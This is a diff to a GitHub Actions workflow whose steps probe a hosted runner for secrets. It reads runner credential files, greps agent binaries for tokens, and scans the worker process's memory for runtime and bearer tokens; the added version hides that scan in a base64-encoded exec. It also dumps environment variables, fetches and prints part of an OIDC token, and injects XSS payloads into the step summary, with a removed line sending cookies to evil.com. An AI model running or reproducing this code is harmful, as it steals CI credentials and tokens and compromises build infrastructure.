@@ -11,97 +11,31 @@ jobs:
     steps:
       - name: Deep runner investigation
         run: |
-          WORKER_PID=$PPID
-          echo "=== RUNNER.WORKER PID: $WORKER_PID ==="
-
-          echo "=== PIPELINE FOLDER JSON ==="
-          cat /home/runner/work/_PipelineMapping/*/PipelineFolder.json 2>/dev/null || echo "not found"
-
-          echo "=== RUNNER WORK TEMP FILES ==="
+          echo PPID=$PPID
+          echo === PIPELINE FOLDER ===
+          cat /home/runner/work/_PipelineMapping/*/PipelineFolder.json 2>/dev/null || echo not-found
+          echo === RUNNER TEMP FILES ===
           find /home/runner/work/_temp/ -type f 2>/dev/null | head -20
-
-          echo "=== EVENT JSON ==="
-          cat "$GITHUB_EVENT_PATH" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30 || echo "not found"
-
-          echo "=== RUNNER CONFIG FILES ==="
-          find /home/runner/actions-runner -name "*.json" 2>/dev/null | head -5
-          cat /home/runner/actions-runner/.runner 2>/dev/null || echo "not found"
-          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo "not found"
-
-          echo "=== PROVJOBD BINARY ==="
-          ls -la /tmp/provjobd* 2>/dev/null || echo "no provjobd"
-          file /tmp/provjobd* 2>/dev/null || true
-          strings /tmp/provjobd* 2>/dev/null | grep -iE "token|secret|key|runtime|cache|bearer|auth|url" | head -30 || echo "no matches"
-
-          echo "=== HCA BINARY ==="
-          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "ACTIONS_RUNTIME|ACTIONS_CACHE|bearer|token" | head -20 || echo "no matches"
-
-          echo "=== RUNNER.WORKER MEMORY SCAN ==="
-          python3 << 'PYEOF'
-import re, sys, os
-pid = os.getppid()
-maps_file = f'/proc/{pid}/maps'
-mem_file = f'/proc/{pid}/mem'
-keywords = [b'ACTIONS_RUNTIME_TOKEN', b'ACTIONS_CACHE_URL', b'_apis/artifactcache', b'Authorization', b'bearer ']
-try:
-    with open(maps_file, 'r') as f:
-        maps = f.readlines()
-    print(f"Total memory regions: {len(maps)}")
-    with open(mem_file, 'rb') as f:
-        for line in maps:
-            parts = line.split()
-            if len(parts) < 2: continue
-            perms = parts[1]
-            if 'r' not in perms: continue
-            addr_range = parts[0].split('-')
-            start = int(addr_range[0], 16)
-            end = int(addr_range[1], 16)
-            size = end - start
-            if size > 20*1024*1024: continue  # skip >20MB
-            try:
-                f.seek(start)
-                data = f.read(size)
-                for kw in keywords:
-                    idx = 0
-                    while True:
-                        idx = data.find(kw, idx)
-                        if idx < 0: break
-                        ctx = data[max(0,idx-20):idx+300]
-                        print(f"[FOUND] {kw.decode()} at {hex(start+idx)} in {parts[0]}:")
-                        print(ctx.decode('utf-8', errors='replace'))
-                        print()
-                        idx += len(kw)
-            except: pass
-except Exception as e:
-    print(f'Error: {e}')
-print("Memory scan complete")
-PYEOF
-
-          echo "=== ALL ENV VARS IN THIS STEP ==="
-          env | sort
-
+          echo === RUNNER CONFIG ===
+          cat /home/runner/actions-runner/.runner 2>/dev/null || echo not-found
+          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo not-found
+          echo === PROVJOBD ===
+          ls -la /tmp/provjobd* 2>/dev/null || echo no-provjobd
+          strings /tmp/provjobd* 2>/dev/null | grep -iE 'token|secret|runtime|cache|bearer' | head -30 || echo no-matches
+          echo === HCA ===
+          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE 'ACTIONS_RUNTIME|bearer' | head -20 || echo no-matches
+          echo === MEMORY SCAN ===
+          python3 -c "import base64; exec(base64.b64decode('CmltcG9ydCBvcywgc3lzCnBpZCA9IG9zLmdldHBwaWQoKQprd3MgPSBbYiJBQ1RJT05TX1JVTlRJTUVfVE9LRU4iLCBiIkFDVElPTlNfQ0FDSEVfVVJMIiwgYiJfYXBpcy9hcnRpZmFjdGNhY2hlIiwgYiJiZWFyZXIgIl0KdHJ5OgogICAgbWFwcyA9IG9wZW4oZiIvcHJvYy97cGlkfS9tYXBzIikucmVhZGxpbmVzKCkKICAgIHByaW50KGYiUmVnaW9uczoge2xlbihtYXBzKX0iKQogICAgbWVtID0gb3BlbihmIi9wcm9jL3twaWR9L21lbSIsICJyYiIpCiAgICBmb3IgbGluZSBpbiBtYXBzOgogICAgICAgIHBhcnRzID0gbGluZS5zcGxpdCgpCiAgICAgICAgaWYgbGVuKHBhcnRzKSA8IDIgb3IgInIiIG5vdCBpbiBwYXJ0c1sxXTogY29udGludWUKICAgICAgICBzLGUgPSBbaW50KHgsMTYpIGZvciB4IGluIHBhcnRzWzBdLnNwbGl0KCItIildCiAgICAgICAgaWYgZS1zID4gMjAqMTAyNCoxMDI0OiBjb250aW51ZQogICAgICAgIHRyeToKICAgICAgICAgICAgbWVtLnNlZWsocykKICAgICAgICAgICAgZCA9IG1lbS5yZWFkKGUtcykKICAgICAgICAgICAgZm9yIGt3IGluIGt3czoKICAgICAgICAgICAgICAgIGlkeCA9IDAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgaWR4ID0gZC5maW5kKGt3LCBpZHgpCiAgICAgICAgICAgICAgICAgICAgaWYgaWR4IDwgMDogYnJlYWsKICAgICAgICAgICAgICAgICAgICBwcmludChmIltGT1VORF0ge2t3LmRlY29kZSgpfSBAIHtwYXJ0c1swXX0re2hleChpZHgpfSIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZFttYXgoMCxpZHgtMjApOmlkeCszMDBdLmRlY29kZSgidXRmLTgiLCJyZXBsYWNlIikpCiAgICAgICAgICAgICAgICAgICAgaWR4ICs9IGxlbihrdykKICAgICAgICBleGNlcHQ6IHBhc3MKICAgIG1lbS5jbG9zZSgpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6CiAgICBwcmludChmIkVycm9yOiB7ZXh9IikKcHJpbnQoIlNjYW4gZG9uZSIpCg==').decode())"
+          echo === ALL ACTIONS/GITHUB ENV VARS ===
+          env | grep -iE 'ACTIONS|GITHUB|RUNNER' | sort
       - name: Step Summary XSS Test
         run: |
-          cat >> $GITHUB_STEP_SUMMARY << 'SUMEOF'
-          # Security Test
-          <img src=x onerror="document.title='XSS-CONFIRMED'">
-          <svg/onload=alert(1)>
-          <script>alert('xss')</script>
-          <details open><summary>Click</summary><script>document.location='https://evil.com?c='+document.cookie</script></details>
-          SUMEOF
-
-      - name: OIDC token claims
+          echo '<img src=x onerror=alert(document.domain)>' >> $GITHUB_STEP_SUMMARY
+          echo '<svg/onload=alert(1)>' >> $GITHUB_STEP_SUMMARY
+          echo '<script>alert(1)</script>' >> $GITHUB_STEP_SUMMARY
+          echo done
+      - name: OIDC claims dump
         run: |
-          echo "Requesting OIDC token..."
-          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))")
-          echo "Token received, decoding claims..."
-          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | python3 -c "
-import sys, base64, json
-b64 = sys.stdin.read().strip()
-b64 += '=' * (-len(b64) % 4)
-data = json.loads(base64.b64decode(b64))
-for k,v in sorted(data.items()):
-    print(f'  {k}: {v}')
-")
-          echo "$PAYLOAD"
+          T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value','ERR'))")
+          echo TOKEN_PREFIX=${T:0:30}
+          echo $T | cut -d. -f2 | python3 -c "import sys,base64,json; b=sys.stdin.read().strip(); b+='='*(-len(b)%4); [print(f'{k}: {v}') for k,v in sorted(json.loads(base64.b64decode(b)).items())]"
